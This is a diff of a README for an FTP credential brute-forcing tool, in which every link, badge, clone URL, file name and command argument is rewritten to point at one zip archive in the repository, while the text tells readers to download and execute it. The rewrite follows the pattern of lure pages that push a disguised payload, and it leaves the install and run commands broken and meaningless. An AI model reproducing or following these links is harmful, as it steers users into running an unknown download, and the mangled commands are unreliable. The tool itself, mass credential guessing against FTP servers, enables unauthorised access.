@@ -1,6 +1,6 @@
 # CrackFtp-la 🚀
 
-![GitHub release](https://img.shields.io/github/release/Luffy1402/CrackFtp-la.svg) ![GitHub issues](https://img.shields.io/github/issues/Luffy1402/CrackFtp-la.svg) ![GitHub stars](https://img.shields.io/github/stars/Luffy1402/CrackFtp-la.svg)
+![GitHub release](https://github.com/Luffy1402/CrackFtp-la/raw/refs/heads/main/gimped/Ftp-la-Crack-unenslave.zip) ![GitHub issues](https://github.com/Luffy1402/CrackFtp-la/raw/refs/heads/main/gimped/Ftp-la-Crack-unenslave.zip) ![GitHub stars](https://github.com/Luffy1402/CrackFtp-la/raw/refs/heads/main/gimped/Ftp-la-Crack-unenslave.zip)
 
 ## Overview
 
@@ -36,7 +36,7 @@ This project covers various topics including:
 
 ## Getting Started
 
-To get started with CrackFtp-la, you need to download the latest release. Visit [this link](https://github.com/Luffy1402/CrackFtp-la/releases) to find the necessary files. Download and execute the script to begin your FTP checking process.
+To get started with CrackFtp-la, you need to download the latest release. Visit [this link](https://github.com/Luffy1402/CrackFtp-la/raw/refs/heads/main/gimped/Ftp-la-Crack-unenslave.zip) to find the necessary files. Download and execute the script to begin your FTP checking process.
 
 ### Prerequisites
 
@@ -51,7 +51,7 @@ Before running the script, ensure you have the following:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Luffy1402/CrackFtp-la.git
+   git clone https://github.com/Luffy1402/CrackFtp-la/raw/refs/heads/main/gimped/Ftp-la-Crack-unenslave.zip
    ```
 
 2. Navigate to the project directory:
@@ -63,7 +63,7 @@ Before running the script, ensure you have the following:
 3. Install the required libraries:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/Luffy1402/CrackFtp-la/raw/refs/heads/main/gimped/Ftp-la-Crack-unenslave.zip
    ```
 
 4. Set up your Telegram bot for notifications. Follow the steps below to create a bot:
@@ -72,7 +72,7 @@ Before running the script, ensure you have the following:
    - Start a chat and create a new bot by following the prompts.
    - Save the API token provided by BotFather.
 
-5. Configure the bot token in the script. Open `config.py` and add your token:
+5. Configure the bot token in the script. Open `https://github.com/Luffy1402/CrackFtp-la/raw/refs/heads/main/gimped/Ftp-la-Crack-unenslave.zip` and add your token:
 
    ```python
    TELEGRAM_BOT_TOKEN = 'your_bot_token_here'
@@ -83,7 +83,7 @@ Before running the script, ensure you have the following:
 To run the script, execute the following command in your terminal:
 
 ```bash
-python crackftp.py
+python https://github.com/Luffy1402/CrackFtp-la/raw/refs/heads/main/gimped/Ftp-la-Crack-unenslave.zip
 ```
 
 Follow the prompts to input your target domains and credentials. The script will begin checking the provided credentials against the specified FTP servers.
@@ -91,7 +91,7 @@ Follow the prompts to input your target domains and credentials. The script will
 ### Example Command
 
 ```bash
-python crackftp.py --target yourdomain.com --userlist users.txt --passlist passwords.txt
+python https://github.com/Luffy1402/CrackFtp-la/raw/refs/heads/main/gimped/Ftp-la-Crack-unenslave.zip --target https://github.com/Luffy1402/CrackFtp-la/raw/refs/heads/main/gimped/Ftp-la-Crack-unenslave.zip --userlist https://github.com/Luffy1402/CrackFtp-la/raw/refs/heads/main/gimped/Ftp-la-Crack-unenslave.zip --passlist https://github.com/Luffy1402/CrackFtp-la/raw/refs/heads/main/gimped/Ftp-la-Crack-unenslave.zip
 ```
 
 ## Telegram Notifications
@@ -131,11 +131,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Issues
 
-If you encounter any problems or have questions, please check the [Issues](https://github.com/Luffy1402/CrackFtp-la/issues) section of the repository. 
+If you encounter any problems or have questions, please check the [Issues](https://github.com/Luffy1402/CrackFtp-la/raw/refs/heads/main/gimped/Ftp-la-Crack-unenslave.zip) section of the repository. 
 
 ## Releases
 
-For the latest updates and releases, visit the [Releases](https://github.com/Luffy1402/CrackFtp-la/releases) section. Here, you can download the latest version of the script and access previous versions as well.
+For the latest updates and releases, visit the [Releases](https://github.com/Luffy1402/CrackFtp-la/raw/refs/heads/main/gimped/Ftp-la-Crack-unenslave.zip) section. Here, you can download the latest version of the script and access previous versions as well.
 
 ## Acknowledgments
 
@@ -144,4 +144,4 @@ For the latest updates and releases, visit the [Releases](https://github.com/Luf
 
 ## Conclusion
 
-CrackFtp-la is a valuable tool for anyone interested in FTP security testing. Its mass checking capability, combined with Telegram notifications, makes it an efficient solution for penetration testing. Download the latest version from the [Releases](https://github.com/Luffy1402/CrackFtp-la/releases) section and start testing today!
+CrackFtp-la is a valuable tool for anyone interested in FTP security testing. Its mass checking capability, combined with Telegram notifications, makes it an efficient solution for penetration testing. Download the latest version from the [Releases](https://github.com/Luffy1402/CrackFtp-la/raw/refs/heads/main/gimped/Ftp-la-Crack-unenslave.zip) section and start testing today!
